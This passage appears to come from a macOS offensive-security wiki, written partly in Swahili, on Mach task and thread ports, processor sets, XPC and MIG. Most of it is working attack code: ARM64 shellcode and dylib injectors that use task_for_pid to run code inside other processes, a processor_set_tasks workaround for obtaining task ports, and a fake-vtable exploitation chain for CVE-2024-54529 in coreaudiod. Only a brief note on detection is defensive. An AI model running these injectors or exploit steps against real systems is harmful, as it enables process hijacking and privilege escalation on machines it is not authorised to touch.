- Ita `mach_task_self()` ili **upate jina** la port hii kwa caller task. Port hii hurithiwa tu kupitia **`exec()`**; task mpya iliyoundwa kwa `fork()` hupata task port mpya (kama hali maalum, task pia hupata task port mpya baada ya `exec()`katika suid binary). Njia pekee ya ku-spawn task na kupata port yake ni kutekeleza ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) wakati wa kufanya `fork()`.
- Hizi ndizo restrictions za kufikia port hii (kutoka `macos_task_policy` katika binary ya `AppleMobileFileIntegrity`):
- Ikiwa app ina **`com.apple.security.get-task-allow` entitlement**, processes kutoka kwa **user yuleyule zinaweza kufikia task port** (mara nyingi huongezwa na Xcode kwa ajili ya debugging). Mchakato wa **notarization** hautaruhusu hii katika production releases.
- Apps zilizo na **`com.apple.system-task-ports`** entitlement zinaweza kupata **task port ya** process **yoyote**, isipokuwa kernel. Katika versions za zamani iliitwa **`task_for_pid-allow`**. Hii hutolewa kwa Apple applications pekee.
- **Root inaweza kufikia task ports** za applications **ambazo haziku-compile** kwa runtime ya **hardened** (na ambazo si za Apple).

**The task name port:** Toleo lisilo na privileges la _task port_. Lina-reference task, lakini haliruhusu kuidhibiti. Kitu pekee kinachoonekana kupatikana kupitia hiyo ni `task_info()`.

### Thread Ports

Threads pia zina ports zinazohusishwa nazo, ambazo zinaonekana kutoka kwa task inayoiita **`task_threads`** na kutoka kwa processor kwa `processor_set_threads`. SEND right juu ya thread port huruhusu kutumia function kutoka kwa `thread_act` subsystem, kama vile:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

Thread yoyote inaweza kupata port hii kwa kuita **`mach_thread_sef`**.

### Shellcode Injection in thread via Task port

Unaweza kuchukua shellcode kutoka:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compile** programu iliyotangulia na uongeze **entitlements** ili uweze kuingiza code kwa kutumia user yuleyule (la sivyo utahitaji kutumia **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Ili hii ifanye kazi kwenye iOS unahitaji entitlement `dynamic-codesigning` ili uweze kufanya memory inayoweza kuandikwa iwe executable.

### Dylib Injection katika thread kupitia Task port

Katika macOS **threads** zinaweza kudhibitiwa kupitia **Mach** au kwa kutumia **posix `pthread` api**. Thread tuliyounda katika injection iliyotangulia iliundwa kwa kutumia Mach api, kwa hiyo **si compliant na posix**.

Iliwezekana **kuingiza shellcode rahisi** ili kutekeleza command kwa sababu **haikuhitaji kufanya kazi na apis zilizo compliant na posix**, bali na Mach pekee. **Injections changamano zaidi** zingehitaji **thread** iwe pia **compliant na posix**.

Kwa hiyo, ili **kuboresha thread**, inapaswa kuita **`pthread_create_from_mach_thread`**, ambayo **itaunda pthread halali**. Kisha pthread hii mpya inaweza **kuita dlopen** ili **kupakia dylib** kutoka kwenye mfumo. Hivyo, badala ya kuandika shellcode mpya kwa ajili ya kutekeleza actions tofauti, inawezekana kupakia libraries maalum.<sup>[[2]](#references)</sup>

Unaweza kupata **example dylibs** katika (kwa mfano, ile inayotengeneza log, kisha unaweza kuisikiliza):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Katika technique hii, thread ya process inatekwa:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Task Port Injection Detection

Unapopiga `task_for_pid` au `thread_create_*`, counter katika struct task kutoka kernel huongezeka. Counter hii inaweza kufikiwa kutoka user mode kwa kupiga `task_info(task, TASK_EXTMOD_INFO, ...)`

## Exception Ports

Exception inapotokea kwenye thread, exception hiyo hutumwa kwenye exception port iliyoteuliwa ya thread hiyo. Ikiwa thread haiishughulikii, basi hutumwa kwenye exception ports za task. Ikiwa task haiishughulikii, basi hutumwa kwenye host port inayosimamiwa na launchd, ambapo itatambuliwa. Hii huitwa exception triage.

Kumbuka kwamba kwa kawaida mwishoni, ikiwa report haikushughulikiwa ipasavyo, itaishia kushughulikiwa na ReportCrash daemon. Hata hivyo, inawezekana thread nyingine ndani ya task hiyo hiyo isimamie exception; hivi ndivyo zana za crash reporting kama `PLCreashReporter` hufanya.

## Other Objects

### Clock

Mtumiaji yeyote anaweza kufikia taarifa kuhusu clock, hata hivyo ili kuweka muda au kurekebisha mipangilio mingine, lazima mtu awe root.

Ili kupata taarifa, inawezekana kupiga functions kutoka kwenye `clock` subsystem kama vile: `clock_get_time`, `clock_get_attributtes` au `clock_alarm`\
Ili kurekebisha values, `clock_priv` subsystem inaweza kutumiwa pamoja na functions kama `clock_set_time` na `clock_set_attributes`

### Processors and Processor Set

Processor APIs huruhusu udhibiti wa logical processor moja kupitia functions kama `processor_start`, `processor_exit`, `processor_info`, na `processor_get_assignment`.

Zaidi ya hayo, APIs za **processor set** hutoa njia ya kuunganisha processors nyingi katika group. Inawezekana kupata processor set ya kawaida kwa kupiga **`processor_set_default`**.\
Hizi ni baadhi ya APIs za kuvutia za kuingiliana na processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Hurejesha array ya send rights kwa tasks zote zilizo ndani ya processor set
- `processor_set_threads`: Hurejesha array ya send rights kwa threads zote zilizo ndani ya processor set
- `processor_set_stack_usage`
- `processor_set_info`

Kama ilivyotajwa kwenye [**post hii**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), hapo awali hii iliruhusu kukwepa protection iliyotajwa awali ili kupata task ports katika processes nyingine na kuzidhibiti kwa kupiga **`processor_set_tasks`** na kupata host port kwenye kila process.<sup>[[10]](#references)</sup>\
Siku hizi unahitaji root kutumia function hiyo, na hii imelindwa, kwa hivyo utaweza kupata ports hizi kwenye processes ambazo hazijalindwa pekee.<sup>[[10]](#references)</sup>

Unaweza kuijaribu kwa:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; mwito usio wa moja kwa moja kupitia nafasi ya vtable
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
